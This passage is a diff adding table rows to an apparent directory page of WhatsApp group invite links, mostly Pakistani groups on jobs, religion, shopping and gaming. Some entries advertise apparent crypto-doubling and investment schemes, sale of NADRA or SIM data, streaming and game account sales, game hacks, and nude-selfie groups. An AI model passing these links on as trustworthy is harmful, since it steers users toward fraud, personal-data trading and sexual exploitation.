+                       window.open('../../external.html?link=https://chat.whatsapp.com/BMqSZOfMsVOA1XPFnTmnFI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Indian scandales 18+</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DbzyptYawGJ6xLOKluEAML'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Icms educatinal news</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LJa3LymDbTi1yPCQazOAFb'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ECONEX(Network Marketing)</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HehZmMkqdDZEN6gGf6Te6x'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg IDs sale purchase</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JhPgurikefr7UmcmTcK6Jd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Fashion Mania </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GPIx3VUTer86iZOp20yPb2'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Crepto doubler website </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Dy0qoBFLl1984lj93TXOw5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Onlion Shopping </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HrRd8L3NhBS39RxDdrfpMl'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Onlion Shop</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EKUOpIpAdhD6DeiqxtaOfd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg accounts</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BrISDjVwydNKw8TH6MswcC'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Hassi tu phassi</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KpysVSWG9XcLY3Y5BBCE78'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>PAK ALL IN ONE GROUP </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Gohr9pjNK91EtoU8dt2j5h'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>وادی سون نیوز</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/K2cfMjovRl4KDP4cBq5nnh'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>youtube secret triks</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FnpAPqTK4ITElI1JWdmMv0'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Urdu Poetry Only </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BVW1Ly99pOcKRMOA1LaUxf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Smart Collections</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LOYQgsJELs13y2XJcNoaTK'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>pubg account buy and sale </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Jm7ZCN5TnZX7RZD0qjAFMG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>All tv drama</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BEJ0pFmEMXUKbM9kdVnZeQ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online jobs </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JADgtSEUzLbJC9MlaX8Jxh'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Reselling</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IkD7qJLOzYDIwlfkNLtyri'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn Without Investment with instagram</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Luuv5dxXCxNKG8DY7G4HYy'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>FORSAGE Best platform </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JqmMgF0YrY12GNIQzrg8Jv'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>𝐒𝐎𝐋𝐌𝐀𝐗</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LPvxhVrKXrDGyatn1798QM'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>News funny sports</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LGCNHSIhudfJLhspr5dlt7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🍁⃟🇫ᴀsт✤͜ 🇩Rᴀмᴀ 🇬Rouᴘ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FOVkXBsB8B6IQ4AhMbJAu2'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Time Pass</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GJjyYYr3iHD6p0fUDDFuex'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>VIP people</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DNc3Y0c5dPME8kBEqgSZgR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Job magazine All today job</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L5HC2cvqYUI2mIKkE88kFk'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>YouTube promotion series </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KSsmniy9WS62eRaRaFu2Sp'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ꜰɪɴᴅ ʏᴏᴜʀ ꜱᴏᴜʟᴍᴀᴛᴇꜰɪɴᴅ ʏᴏᴜʀ ꜱᴏᴜʟᴍᴀᴛᴇ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EpzRwihJBsBHd9cyQeEQex'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Forever cosmetics and ladies undergarments</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HOX44H0ZN9a72IrgfaOi6s'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Forsage.io</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/B95uqYcHhMK1D4X8cRtaO2'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tiktok like back to back</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Eg0VvsACNNlBwiXifnCgZO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Urdu Poetry</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DK6hHnC81NjFJIAXOzZ94z'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Products Seller Website In Pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DxGhO99rdJl3QBLTRyvDUL'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>I ❤ islam</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://socialclu.com/100-islamic-whatsapp-group-links/'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Smart X TV </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/F8QSbOf6iWAL8v2nTpLtOq'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Enough ≈ Edit</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/De3tY5IOTzG7itMFOa0h79'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Friend with boys for girls</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CiCMnIMum824F9Utsu1YHv'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Balveer  return Hd</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ctnc32NGVJaH8X5DzSebV1'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>SiM DATA TRACKERS</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IPrrqZBEJKd6Rz2S7NIamY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Money From Google 100%</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HLGVv59xrGFJA3kiCKHP05'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Civic jobs</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CmnXWkVtGbG0JTsQz9RVxI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🃏⁦⁦⁦PERFECT ⁩VIRUS⁦⁦⁦🃏</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Cs9ppLIdlrC5ReGNAoF4cB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🥏ᴀᵖᵖˢ ɢʳᵒᵘᵖ ʟⁱⁿᵏ🪀✔️</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CuCjWQmJ0Rq9prcoUPPfQ3'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Linguistics & Literature </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ep1D0JJuKocFRaL6EaSdZO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Daily Quraan Tafseer</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EbDpAmvA92g9PN3CAbolW2'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tiktok Paid Promotion</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DtRgYLJoV6FBIaYPq0eEGg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Muslim </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HvuHitU9JBGGGf2mAsNOjr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Marriage.pk</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DJZxqLwFAij6RMA8CxuQv4'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Only for Amazon Buyers</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IMndkL5l38l3zamttJLPIN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>sun Light</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BWw2FxKT66f3cka5xwZCIo'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Investment bussnis for bitkripton</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CCNp6bvSU0w5oxWy2DQr53'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Create profile image</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/H0VsQCL0HRVIlDagH9y57a'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg prime plus</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Fz1I9uu0FnFAM4LcGpxSUX'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg.Hacks😈</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IfpmXomhiGP0KQ37wRHltP'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Muslim love</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FRvGWDp4l767GNeL6Nr5Pu'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Oriflame cosmetics</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ISCEIzyFMhcKlNbeT9SxkE'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🇵🇰🎬 𝔾𝔼𝕆 𝕂𝔸ℍ𝔸ℕ𝕀🎧🇵🇰</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KNPkpe696XVDBzRvvpivWj'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>You tube Copyright work</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DIyfYhrLxIH9FEPbU89cfB'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>OraZon</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LQHVmxblX6QIYAq2ZoXlTa'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>islami group </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CkKWNqTZSb8GNmREUY9YQi'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ishq aibadat </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BwLAbfU4WXQEzmqA93Zl3D'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Atish e ishq </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CTTUlI7LAiM29ZQcmtBYMS'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mekhane ishq</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IHwzwGcV0XYAPZADSOqulY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Nadra database</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L5Qc0xloyoCI5X0kJKJJho'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Entertainment</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BDv9qpcCrvj04j0AZRM2r9'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Typing job real</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IW6Hw20fn1FCobZ6Uiw5NS'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Typing job</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DiCR738c9LPKtCeysj001t'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Ads watch jon</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/B6GGqssj1U9EupsDBC8pv5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online work</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IerXoeKXKdgKuCSvB6RZIg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>PUBG ID SELLRR</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EbHVcLm7vKGI93HixqEaNd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistan news group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JLwrLsWVHtkJzZBcnfE9a4'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg prime plus</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/InzKlv5cqUkH7HZf4ZCYvV'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>New brands </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GozhzZ4soaJFb69B502gpx'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Onine earinng for all</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HxeiwKszHy95YUc8DjKRJp'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ناول کہانیاں </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GOMduejYPUlIZLtdW6FW3r'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ناول کہانیاں </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GZhVkwTLmyg8danCrkvii6'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islam&information</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/F78tdEnto9P3scsCWT5SOt'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tik Tok like and follwer only girl</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GdMhVd7RsiN5no8kOAhQhE'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Photo_logo_intro_editing</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GJueFSFEPXiHRpdEMrgfAd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Hand med leather shoes</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IDDiOfMBcVxAkwHXoeBRit'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tax Professionals-2</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IfCtl1tPg1p3z00802RnWu'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Bitcoin® Trusted CEO INVESTMENT Website </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EZsDx9wNyrQ3p36kJLWjra'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>WWE Group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/F8DLjx34SDjJeLLvTznhtR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>اسلامک گروپ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/InIYYBsktc1BidGTCEtvBz'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistan Army</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FwpFpfpw5kEAFebXRFZY8B'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online earning </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ERrIgQpwW3a59KoPh6Vndd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Real online earning 100%✓</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LIgA5oKnJJd0NRzj6uXMri'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>YouTube promoters</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DEdZ86LFq7x1SJjG542Ni5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online real earning</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IvEBvAMYFw755eE5WyJIXW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tik tok support</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IQEwl9NZH0z4mCT7EoHe0C'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Drop Nude Selfie</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HT5vAWhBd9n5glTdJPGCHg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Daily Pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FPGj2OoJXPdLxZNgLQIhLA'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Dil Dosti etc.🦋</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DDpgnBWvrHTLQQwALaYANm'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Nts latest objectives</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ITxfLm0oB1CLYZpotC0reR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Rajput brand </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BzLi1Cqyewt8ZVKmctPQq3'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn Money With Play Pubg Game</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LWdx4exe3gZA7bEoFBUlUJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Daily Quraan Tafseer</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/H5KrXn3Bett3iUxrS9N7fW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Betting company</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EGYdTRmAPLP8Vjv3KtB0pd'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Shoes Business In pakistan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LVW8dzxDRIlCMoOqOrlNVo'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online work without investment💯</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Lxj2qJEpClEAIRSy68i09Q'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>(3)اصلاحِ معاشرہ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IyXbl8ghe1120vpUNurz8v'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Cosmetics Makeup Perfumes Jewelry</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LwDtx49apvfJeDSREO99Zb'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Resaler group pakistan </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JGPiiXiekFV5le7sCP3qe4'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Mobile khrdain or bachain</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GU2FUo0hZLU6J2p2pssZ7f'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Nts latest objectives</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ITxfLm0oB1CLYZpotC0reR'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>⁦⁩⁦تاریخ پاکستان🇵🇰</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BLNUOc5D5cN5bbMAR5RI98'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pak Youtubers Islamabad </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HqQDJryTJiDLlYKJ6E1H5H'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Car 4 Sale </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HBbcJj5i4AVHCkWROLHoHr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>❤️آل سنگربلوچی دھماکہ🔨</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D5SYbjccpqPJDUwT6GwHWv'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Rajaraja group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LJZnDvqM3VvEyt4rqzFRVz'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn money online</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FKQfFZCTEmxCL0VOrzh0H6'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>SARA Jewelers online Shopping Artificial jewelry</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/H1dTX5RLX4F5uRlq6lrZvY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Neflix Premium Accounts Sale</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BTUnIkxldezDILhSWrO39x'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earn Money With Play Pubg Game</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LWdx4exe3gZA7bEoFBUlUJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Shayari status or videos</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/L57SgU9aP6S5xD6SEZJINr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Invest kr k kamao</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BzkfBjfVWrq7ghYJCBCGcL'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Frindship group</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HHoKbd0exBcCSoZuAgfOQO'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Beurax global</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HmmTqcdoyhC6f2JhysQNyI'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Earning for just a little click </i></td>
+<td><button class="btn btn-success" onclick="
